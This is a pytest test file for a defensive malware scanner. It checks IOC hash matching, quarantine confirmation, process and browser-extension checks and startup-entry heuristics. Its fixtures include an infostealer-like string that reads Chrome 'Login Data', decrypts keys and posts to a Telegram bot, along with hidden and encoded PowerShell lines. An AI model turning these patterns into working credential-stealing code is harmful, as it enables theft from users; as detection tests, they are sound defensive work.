import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from sentinel.core.models import Severity, Verdict
from sentinel.core.quarantine import Quarantine, QuarantineError
from sentinel.core.signatures import IOCDatabase
from sentinel.scanners.browser_scanner import evaluate_manifest
from sentinel.scanners.file_scanner import scan_file, scan_paths
from sentinel.scanners.process_scanner import ProcInfo, evaluate_process, sensitive_store_kind
from sentinel.scanners.startup_scanner import evaluate_command, extract_path
import hashlib


def test_clean_file_no_finding(tmp_path):
    f = tmp_path / "ok.py"; f.write_text("print('hello')")
    assert scan_file(str(f)) is None


def test_ioc_match_is_confirmed(tmp_path):
    f = tmp_path / "x.exe"; f.write_bytes(b"test-sample-bytes")
    h = hashlib.sha256(b"test-sample-bytes").hexdigest()
    lst = tmp_path / "ioc.txt"; lst.write_text(f"{h}  # TestFamily\nnotahash\n")
    db = IOCDatabase(); assert db.load_file(lst) == 1
    r = scan_file(str(f), db)
    assert r.verdict == Verdict.CONFIRMED and r.sha256 == h


def test_heuristics_are_suspicious_never_confirmed(tmp_path):
    f = tmp_path / "s.py"
    f.write_text('open("Login Data"); k="encrypted_key"; CryptUnprotectData;\n'
                 'requests.post("https://api.telegram.org/bot123/sendDocument")')
    r = scan_file(str(f))
    assert r.verdict == Verdict.SUSPICIOUS and r.severity >= Severity.HIGH


def test_single_weak_indicator_ignored(tmp_path):
    f = tmp_path / "w.ps1"; f.write_text("powershell -WindowStyle Hidden")
    assert scan_file(str(f)) is None


def test_unreadable_is_unknown():
    r = scan_file("/nonexistent/file.exe")
    assert r.verdict == Verdict.UNKNOWN


def test_scan_paths_filters_extensions(tmp_path):
    (tmp_path / "a.txt").write_text("Login Data"); (tmp_path / "b.js").write_text("1")
    found, n = scan_paths([str(tmp_path)])
    assert n == 1 and found == []


def test_quarantine_requires_confirmation(tmp_path):
    f = tmp_path / "m.exe"; f.write_bytes(b"abc")
    q = Quarantine(tmp_path / "vault")
    try:
        q.quarantine(str(f), False); assert False
    except QuarantineError:
        pass
    assert f.exists()
    d = q.quarantine(str(f), True)
    assert not f.exists() and d.exists() and len(q.list()) == 1
    q.restore(str(d), True); assert f.exists()


def test_sensitive_store_kind():
    assert sensitive_store_kind(r"C:\Users\a\AppData\Local\Google\Chrome\User Data\Default\Login Data")
    assert sensitive_store_kind(r"C:\Users\a\AppData\Roaming\discord\Local Storage\leveldb\000003.log")
    assert sensitive_store_kind(r"C:\Users\a\Documents\Login Data") is None


def test_process_handle_detection_and_browser_exempt():
    p = r"C:\Users\a\AppData\Local\Google\Chrome\User Data\Default\Cookies"
    assert evaluate_process(ProcInfo(1, "chrome.exe", open_paths=[p]), scan_exe=False) == []
    r = evaluate_process(ProcInfo(2, "foo.exe", open_paths=[p]), scan_exe=False)
    assert r and r[0].verdict == Verdict.SUSPICIOUS and r[0].category == "browser"


def test_process_encoded_powershell():
    pi = ProcInfo(3, "powershell.exe", cmdline=["powershell", "-enc", "A" * 60])
    r = evaluate_process(pi, scan_exe=False)
    assert r and r[0].severity == Severity.HIGH


def test_extension_manifest():
    assert evaluate_manifest({"permissions": ["storage"]}) is None
    sev, ind = evaluate_manifest({"permissions": ["cookies", "webRequest", "webRequestBlocking"],
                                  "host_permissions": ["<all_urls>"]})
    assert sev == Severity.MEDIUM and len(ind) == 2


def test_startup_eval():
    assert extract_path('"C:\\a b\\x.exe" --silent') == "C:\\a b\\x.exe"
    f = evaluate_command("HKCU\\Run", "x", r"C:\Users\a\AppData\Roaming\evil.exe", None)
    assert f and f.verdict == Verdict.SUSPICIOUS
    assert evaluate_command("HKLM\\Run", "ok", r"C:\Program Files\App\app.exe", None) is None
